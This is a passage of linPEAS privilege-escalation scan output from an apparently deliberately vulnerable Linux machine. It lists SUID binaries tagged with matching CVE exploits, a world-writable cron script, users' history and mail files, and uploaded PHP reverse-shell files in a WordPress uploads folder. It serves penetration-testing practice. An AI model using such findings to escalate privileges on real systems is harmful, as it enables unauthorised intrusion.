
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 12255 Apr 20  2016 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 12335 Apr 20  2016 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg


╔══════════╣ Analyzing Cache Vi Files (limit 70)

-rw------- 1 peter peter 577 Jun  3  2016 /home/peter/.viminfo
-rw------- 1 SHayslett SHayslett 2986 Jun 30 11:42 /home/SHayslett/.viminfo


╔══════════╣ Analyzing Postfix Files (limit 70)
-rwxr-xr-x 1 root root 7959 Apr 13  2016 /etc/init.d/postfix

-rw-r--r-- 1 root root 30 Apr 13  2016 /etc/insserv.conf.d/postfix

-rwxr-xr-x 1 root root 803 Apr 13  2016 /etc/network/if-down.d/postfix

-rwxr-xr-x 1 root root 1120 Apr 13  2016 /etc/network/if-up.d/postfix

drwxr-xr-x 3 root root 4096 Jun  3  2016 /etc/postfix
-rw-r--r-- 1 root root 6068 Jun  3  2016 /etc/postfix/master.cf
  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py

-rwxr-xr-x 1 root root 803 Apr 13  2016 /etc/ppp/ip-down.d/postfix

-rwxr-xr-x 1 root root 1120 Apr 13  2016 /etc/ppp/ip-up.d/postfix

-rwxr-xr-x 1 root root 426 Apr 13  2016 /etc/resolvconf/update-libc.d/postfix

-rw-r--r-- 1 root root 361 Apr 13  2016 /etc/ufw/applications.d/postfix

drwxr-xr-x 3 root root 4096 Jun  3  2016 /usr/lib/postfix

-rwxr-xr-x 1 root root 9524 Apr 13  2016 /usr/sbin/postfix

drwxr-xr-x 2 root root 4096 Jun  3  2016 /usr/share/doc/postfix

-rw-r--r-- 1 root root 275 Apr 13  2016 /usr/share/lintian/overrides/postfix

drwxr-xr-x 2 root root 4096 Jun  3  2016 /usr/share/postfix

drwxr-xr-x 2 postfix postfix 4096 Jun  3  2016 /var/lib/postfix

drwxr-xr-x 20 root root 4096 Jun  3  2016 /var/spool/postfix
find: ‘/var/spool/postfix/public’: Permission denied
find: ‘/var/spool/postfix/corrupt’: Permission denied
find: ‘/var/spool/postfix/active’: Permission denied
find: ‘/var/spool/postfix/saved’: Permission denied
find: ‘/var/spool/postfix/trace’: Permission denied
find: ‘/var/spool/postfix/maildrop’: Permission denied
find: ‘/var/spool/postfix/deferred’: Permission denied
find: ‘/var/spool/postfix/hold’: Permission denied
find: ‘/var/spool/postfix/private’: Permission denied
find: ‘/var/spool/postfix/incoming’: Permission denied
find: ‘/var/spool/postfix/bounce’: Permission denied
find: ‘/var/spool/postfix/flush’: Permission denied
find: ‘/var/spool/postfix/defer’: Permission denied


╔══════════╣ Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 May 19  2016 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct  8  2020 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 20 Jun  3  2016 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jun  3  2016 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Jul  5 18:48 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc
-rw-r--r-- 1 AParnell AParnell 3771 Sep  1  2015 /home/AParnell/.bashrc
-rw-r--r-- 1 CCeaser CCeaser 3771 Sep  1  2015 /home/CCeaser/.bashrc
-rw-r--r-- 1 CJoo CJoo 3771 Sep  1  2015 /home/CJoo/.bashrc
-rw-r--r-- 1 Drew Drew 3771 Sep  1  2015 /home/Drew/.bashrc
-rw-r--r-- 1 DSwanger DSwanger 3771 Sep  1  2015 /home/DSwanger/.bashrc
-rw-r--r-- 1 Eeth Eeth 3771 Sep  1  2015 /home/Eeth/.bashrc
-rw-r--r-- 1 elly elly 3771 Sep  1  2015 /home/elly/.bashrc
-rw-r--r-- 1 ETollefson ETollefson 3771 Sep  1  2015 /home/ETollefson/.bashrc
-rw-r--r-- 1 IChadwick IChadwick 3771 Sep  1  2015 /home/IChadwick/.bashrc
-rw-r--r-- 1 jamie jamie 3771 Sep  1  2015 /home/jamie/.bashrc
-rw-r--r-- 1 JBare JBare 3771 Sep  1  2015 /home/JBare/.bashrc
-rw-r--r-- 1 jess jess 3771 Sep  1  2015 /home/jess/.bashrc
-rw-r--r-- 1 JKanode JKanode 3771 Sep  1  2015 /home/JKanode/.bashrc
-rw-r--r-- 1 JLipps JLipps 3771 Sep  1  2015 /home/JLipps/.bashrc
-rw-r--r-- 1 kai kai 3771 Sep  1  2015 /home/kai/.bashrc
-rw-r--r-- 1 LSolum2 LSolum2 3771 Sep  1  2015 /home/LSolum2/.bashrc
-rw-r--r-- 1 LSolum LSolum 3771 Sep  1  2015 /home/LSolum/.bashrc
-rw-r--r-- 1 MBassin MBassin 3771 Sep  1  2015 /home/MBassin/.bashrc
-rw-r--r-- 1 mel mel 3771 Sep  1  2015 /home/mel/.bashrc
-rw-r--r-- 1 MFrei MFrei 3771 Sep  1  2015 /home/MFrei/.bashrc
-rw-r--r-- 1 NATHAN NATHAN 3771 Sep  1  2015 /home/NATHAN/.bashrc
-rw-r--r-- 1 peter peter 3771 Jun  3  2016 /home/peter/.bashrc
-rw-r--r-- 1 RNunemaker RNunemaker 3771 Sep  1  2015 /home/RNunemaker/.bashrc
-rw-r--r-- 1 Sam Sam 3771 Sep  1  2015 /home/Sam/.bashrc
-rw-r--r-- 1 SHAY SHAY 3771 Sep  1  2015 /home/SHAY/.bashrc
-rw-r--r-- 1 SHayslett SHayslett 3771 Sep  1  2015 /home/SHayslett/.bashrc
-rw-r--r-- 1 SStroud SStroud 3771 Sep  1  2015 /home/SStroud/.bashrc
-rw-r--r-- 1 Taylor Taylor 3771 Sep  1  2015 /home/Taylor/.bashrc
-rw-r--r-- 1 www www 3771 Sep  1  2015 /home/www/.bashrc
-rw-r--r-- 1 zoe zoe 3771 Sep  1  2015 /home/zoe/.bashrc





-rw-r--r-- 1 root root 655 Jul 12  2019 /etc/skel/.profile
-rw-r--r-- 1 AParnell AParnell 675 Sep  1  2015 /home/AParnell/.profile
-rw-r--r-- 1 CCeaser CCeaser 675 Sep  1  2015 /home/CCeaser/.profile
-rw-r--r-- 1 CJoo CJoo 675 Sep  1  2015 /home/CJoo/.profile
-rw-r--r-- 1 Drew Drew 675 Sep  1  2015 /home/Drew/.profile
-rw-r--r-- 1 DSwanger DSwanger 675 Sep  1  2015 /home/DSwanger/.profile
-rw-r--r-- 1 Eeth Eeth 675 Sep  1  2015 /home/Eeth/.profile
-rw-r--r-- 1 elly elly 675 Sep  1  2015 /home/elly/.profile
-rw-r--r-- 1 ETollefson ETollefson 675 Sep  1  2015 /home/ETollefson/.profile
-rw-r--r-- 1 IChadwick IChadwick 675 Sep  1  2015 /home/IChadwick/.profile
-rw-r--r-- 1 jamie jamie 675 Sep  1  2015 /home/jamie/.profile
-rw-r--r-- 1 JBare JBare 675 Sep  1  2015 /home/JBare/.profile
-rw-r--r-- 1 jess jess 675 Sep  1  2015 /home/jess/.profile
-rw-r--r-- 1 JKanode JKanode 675 Sep  1  2015 /home/JKanode/.profile
-rw-r--r-- 1 JLipps JLipps 675 Sep  1  2015 /home/JLipps/.profile
-rw-r--r-- 1 kai kai 675 Sep  1  2015 /home/kai/.profile
-rw-r--r-- 1 LSolum2 LSolum2 675 Sep  1  2015 /home/LSolum2/.profile
-rw-r--r-- 1 LSolum LSolum 675 Sep  1  2015 /home/LSolum/.profile
-rw-r--r-- 1 MBassin MBassin 675 Sep  1  2015 /home/MBassin/.profile
-rw-r--r-- 1 mel mel 675 Sep  1  2015 /home/mel/.profile
-rw-r--r-- 1 MFrei MFrei 675 Sep  1  2015 /home/MFrei/.profile
-rw-r--r-- 1 NATHAN NATHAN 675 Sep  1  2015 /home/NATHAN/.profile
-rw-r--r-- 1 peter peter 675 Jun  3  2016 /home/peter/.profile
-rw-r--r-- 1 RNunemaker RNunemaker 675 Sep  1  2015 /home/RNunemaker/.profile
-rw-r--r-- 1 Sam Sam 675 Sep  1  2015 /home/Sam/.profile
-rw-r--r-- 1 SHAY SHAY 675 Sep  1  2015 /home/SHAY/.profile
-rw-r--r-- 1 SHayslett SHayslett 675 Sep  1  2015 /home/SHayslett/.profile
-rw-r--r-- 1 SStroud SStroud 675 Sep  1  2015 /home/SStroud/.profile
-rw-r--r-- 1 Taylor Taylor 675 Sep  1  2015 /home/Taylor/.profile
-rw-r--r-- 1 www www 675 Sep  1  2015 /home/www/.profile
-rw-r--r-- 1 zoe zoe 675 Sep  1  2015 /home/zoe/.profile



-rw-r--r-- 1 peter peter 0 Jun  3  2016 /home/peter/.sudo_as_admin_successful



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 36K May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 39K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 157K Mar 30  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 48K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 18K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 36K May 17  2017 /usr/bin/newgidmap
-rwsr-sr-x 1 daemon daemon 50K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 34K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 502K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 38K Mar  7  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 46K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9.6K Jul 26  2015 /usr/lib/authbind/helper
-rwsr-xr-x 1 root root 119K Feb  8  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 34K Apr 13  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 26K Apr 13  2016 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 39K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30K Mar 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 22K May 17  2017 /usr/bin/expiry
-rwsr-sr-x 1 daemon daemon 50K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 422K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 60K May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 26K Apr 13  2016 /usr/bin/wall
-rwxr-sr-x 1 root crontab 39K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root utmp 454K Feb 23  2021 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root utmp 5.4K Mar 11  2016 /usr/lib/i386-linux-gnu/utempter/utempter
-r-xr-sr-x 1 root postdrop 18K Apr 13  2016 /usr/sbin/postqueue
-r-xr-sr-x 1 root postdrop 14K Apr 13  2016 /usr/sbin/postdrop
-rwxr-sr-x 1 root shadow 38K Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 38K Mar 16  2016 /sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-i386-linux-gnu.conf
/usr/lib/i386-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/i386-linux-gnu.conf
/lib/i386-linux-gnu
/usr/lib/i386-linux-gnu
/lib/i686-linux-gnu
/usr/lib/i686-linux-gnu
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
You can write script: /usr/local/sbin/cron-logrotate.sh
/usr/bin/gettext.sh

╔══════════╣ Unexpected in root
/initrd.img.old
/vmlinuz.old

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 24
drwxr-xr-x   2 root root  4096 Jul  5 18:48 .
drwxr-xr-x 100 root root 12288 Jul  5 19:22 ..
-rw-r--r--   1 root root   833 Feb  8  2021 apps-bin-path.sh
-rw-r--r--   1 root root  1557 Apr 14  2016 Z97-byobu.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/MFrei/.bash_history
/home/Sam/.bash_history
/home/CCeaser/.bash_history
/home/DSwanger/.bash_history
/home/JBare/.bash_history
/home/mel/.bash_history
/home/jess/.bash_history
/home/MBassin/.bash_history
/home/kai/.bash_history
/home/elly/.bash_history
/home/Drew/.bash_history
/home/JLipps/.bash_history
/home/jamie/.bash_history
/home/Taylor/.bash_history
/home/SHayslett/.bash_history
/home/AParnell/.bash_history
/home/CJoo/.bash_history
/home/Eeth/.bash_history
/home/RNunemaker/.bash_history
/home/SHAY/.bash_history
/home/ETollefson/.bash_history
/home/IChadwick/.bash_history
/home/LSolum2/.bash_history
/home/SStroud/.bash_history
/home/LSolum/.bash_history
/home/NATHAN/.bash_history
/home/zoe/.bash_history
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/SHayslett
/sys/fs/cgroup/systemd/user.slice/user-1005.slice/user@1005.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/mail/root
/var/log/kern.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/home/SHayslett/.config/lxc/client.key
/home/SHayslett/.config/lxc/client.crt
/home/SHayslett/.gnupg/trustdb.gpg
/home/SHayslett/.gnupg/gpg.conf
/home/SHayslett/.gnupg/pubring.gpg

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation

╔══════════╣ Files inside /home/SHayslett (limit 20)
total 48
drwxr-xr-x  6 SHayslett SHayslett 4096 Jul  5 19:56 .
drwxr-xr-x 32 root      root      4096 Jun  4  2016 ..
-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
-rw-r--r--  1 SHayslett SHayslett  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 SHayslett SHayslett 3771 Sep  1  2015 .bashrc
drwx------  2 SHayslett SHayslett 4096 Jun 30 06:13 .cache
drwxr-x---  3 SHayslett SHayslett 4096 Jul  5 19:56 .config
drwx------  2 SHayslett SHayslett 4096 Jul  5 19:56 .gnupg
-rw-------  1 SHayslett SHayslett 2225 Jun 30 13:31 .mysql_history
-rw-r--r--  1 SHayslett SHayslett  675 Sep  1  2015 .profile
drwx------  2 SHayslett SHayslett 4096 Jul  5 19:24 .ssh
-rw-------  1 SHayslett SHayslett 2986 Jun 30 11:42 .viminfo

╔══════════╣ Files inside others home (limit 20)
/home/MFrei/.bashrc
/home/MFrei/.bash_history
/home/MFrei/.bash_logout
/home/MFrei/.profile
/home/Sam/.bashrc
/home/Sam/.bash_history
/home/Sam/.bash_logout
/home/Sam/.profile
/home/CCeaser/.bashrc
/home/CCeaser/.bash_history
/home/CCeaser/.bash_logout
/home/CCeaser/.profile
/home/www/.bashrc
/home/www/.bash_logout
/home/www/.profile
/home/DSwanger/.bashrc
/home/DSwanger/.bash_history
/home/DSwanger/.bash_logout
/home/DSwanger/.profile
/home/JBare/.bashrc

╔══════════╣ Searching installed mail applications
postfix
postfix
postfix-add-filter
postfix-add-policy
sendmail

╔══════════╣ Mails (limit 50)
    31974      4 -rw-r--r--   1 root     mail          615 Jul  5 19:56 /var/mail/root
    30823     44 -rw-------   1 www-data mail        39991 Jun  5  2016 /var/mail/www-data
    31974      4 -rw-r--r--   1 root     mail          615 Jul  5 19:56 /var/spool/mail/root
    30823     44 -rw-------   1 www-data mail        39991 Jun  5  2016 /var/spool/mail/www-data

╔══════════╣ Backup folders

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 9460 Jan 16  2016 /var/www/https/blogblog/wp-content/plugins/two-factor/providers/class.two-factor-backup-codes.php
-rw-r--r-- 1 root root 5387 Nov 18  2015 /var/www/https/blogblog/wp-content/plugins/two-factor/tests/providers/class.two-factor-backup-codes.php
-rw-r--r-- 1 root root 128 Jun  3  2016 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 20 Apr 15  2016 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 673 Jun  3  2016 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Jun  3  2016 /etc/xml/catalog.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 1624 Mar 14  2016 /usr/share/man/man8/tdbbackup.tdbtools.8.gz
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 9692 Mar 14  2016 /usr/bin/tdbbackup.tdbtools
-rw-r--r-- 1 root root 0 Apr 18  2016 /usr/src/linux-headers-4.4.0-21-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Apr 18  2016 /usr/src/linux-headers-4.4.0-21-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 192911 Apr 18  2016 /usr/src/linux-headers-4.4.0-21-generic/.config.old
-rw-r--r-- 1 root root 0 May 13  2016 /usr/src/linux-headers-4.4.0-22-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 May 13  2016 /usr/src/linux-headers-4.4.0-22-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 193019 May 13  2016 /usr/src/linux-headers-4.4.0-22-generic/.config.old
-rw-r--r-- 1 root root 0 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 194400 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/.config.old
-rw-r--r-- 1 root root 30520 Apr 15  2016 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 6510 Apr 18  2016 /lib/modules/4.4.0-21-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 6842 Apr 18  2016 /lib/modules/4.4.0-21-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 292 Jul  5 18:48 /run/blkid/blkid.tab.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Jun  6  2016 .
drwxr-xr-x 16 root root 4.0K Jun  6  2016 ..
drwxr-xr-x  5 root root 4.0K Jun  5  2016 https

/var/www/https:
total 460K
drwxr-xr-x 5 root root 4.0K Jun  5  2016 .
drwxr-xr-x 3 root root 4.0K Jun  6  2016 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 344 Nov 12  2015 /var/www/https/blogblog/wp-content/plugins/shortcode-ui/.jshintrc
-rw-r--r-- 1 root root 616 Jun  3  2016 /var/www/https/blogblog/wp-content/plugins/akismet/.htaccess
-rw-r--r-- 1 root root 92 Jun  4  2016 /var/www/https/.htaccess
-rw-r--r-- 1 root root 220 Sep  1  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Apr 20  2016 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Feb  4  2021 /usr/share/php/.lock
-rw-r--r-- 1 root root 7080 Feb  4  2021 /usr/share/php/.filemap
-rw-r--r-- 1 MFrei MFrei 220 Sep  1  2015 /home/MFrei/.bash_logout
-rw-r--r-- 1 Sam Sam 220 Sep  1  2015 /home/Sam/.bash_logout
-rw-r--r-- 1 CCeaser CCeaser 220 Sep  1  2015 /home/CCeaser/.bash_logout
-rw-r--r-- 1 www www 220 Sep  1  2015 /home/www/.bash_logout
-rw-r--r-- 1 DSwanger DSwanger 220 Sep  1  2015 /home/DSwanger/.bash_logout
-rw-r--r-- 1 JBare JBare 220 Sep  1  2015 /home/JBare/.bash_logout
-rw-r--r-- 1 mel mel 220 Sep  1  2015 /home/mel/.bash_logout
-rw-r--r-- 1 jess jess 220 Sep  1  2015 /home/jess/.bash_logout
-rw-r--r-- 1 MBassin MBassin 220 Sep  1  2015 /home/MBassin/.bash_logout
-rw-r--r-- 1 kai kai 220 Sep  1  2015 /home/kai/.bash_logout
-rw-r--r-- 1 elly elly 220 Sep  1  2015 /home/elly/.bash_logout
-rw-r--r-- 1 Drew Drew 220 Sep  1  2015 /home/Drew/.bash_logout
-rw-r--r-- 1 JLipps JLipps 220 Sep  1  2015 /home/JLipps/.bash_logout
-rw-r--r-- 1 jamie jamie 220 Sep  1  2015 /home/jamie/.bash_logout
-rw-r--r-- 1 Taylor Taylor 220 Sep  1  2015 /home/Taylor/.bash_logout
-rw-rw-r-- 1 peter peter 39227 Jul  5 19:25 /home/peter/.zcompdump
-rw-r--r-- 1 peter peter 220 Jun  3  2016 /home/peter/.bash_logout
-rw-r--r-- 1 SHayslett SHayslett 220 Sep  1  2015 /home/SHayslett/.bash_logout
-rw-r--r-- 1 JKanode JKanode 220 Sep  1  2015 /home/JKanode/.bash_logout
-rw-r--r-- 1 AParnell AParnell 220 Sep  1  2015 /home/AParnell/.bash_logout
-rw-r--r-- 1 CJoo CJoo 220 Sep  1  2015 /home/CJoo/.bash_logout
-rw-r--r-- 1 Eeth Eeth 220 Sep  1  2015 /home/Eeth/.bash_logout
-rw-r--r-- 1 RNunemaker RNunemaker 220 Sep  1  2015 /home/RNunemaker/.bash_logout
-rw-r--r-- 1 SHAY SHAY 220 Sep  1  2015 /home/SHAY/.bash_logout
-rw-r--r-- 1 ETollefson ETollefson 220 Sep  1  2015 /home/ETollefson/.bash_logout
-rw-r--r-- 1 IChadwick IChadwick 220 Sep  1  2015 /home/IChadwick/.bash_logout
-rw-r--r-- 1 LSolum2 LSolum2 220 Sep  1  2015 /home/LSolum2/.bash_logout
-rw-r--r-- 1 SStroud SStroud 220 Sep  1  2015 /home/SStroud/.bash_logout
-rw-r--r-- 1 LSolum LSolum 220 Sep  1  2015 /home/LSolum/.bash_logout
-rw-r--r-- 1 NATHAN NATHAN 220 Sep  1  2015 /home/NATHAN/.bash_logout
-rw-r--r-- 1 zoe zoe 220 Sep  1  2015 /home/zoe/.bash_logout
-rw-r--r-- 1 root root 0 Jul  5 18:32 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrw-r-- 1 SHayslett SHayslett 776967 Jul  5 11:54 /tmp/linpeas.sh
-rw-r--r-- 1 root root 274 Jun  5  2016 /var/tmp/ls
-rw-r--r-- 1 root root 297 Jun  3  2016 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 1399 Jun  3  2016 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 51200 Jun 30 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 437 Jun  3  2016 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 555453 Jun  7  2016 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 1478 Jun  6  2016 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 14037 Jun  7  2016 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 1418 Jun  4  2016 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 5961 Jun  5  2016 /var/samba/backup/vsftpd.conf
-rw-r--r-- 1 root root 6321767 Apr 27  2015 /var/samba/backup/wordpress-4.tar.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/authbind/byport/80
/home/SHayslett
/home/www
/run/lock
/run/user/1005
/run/user/1005/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1005
#)You_can_write_even_more_files_inside_last_directory

/usr/local/sbin/cron-logrotate.sh
/var/crash
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1005.slice/user@1005.service/tasks
/var/lib/php/sessions
/var/spool/samba
/var/tmp
/var/www/https/blogblog/wp-content/uploads
/var/www/https/blogblog/wp-content/uploads/php-reverse-shell1.php_1.php
/var/www/https/blogblog/wp-content/uploads/php-reverse-shell.php_.php
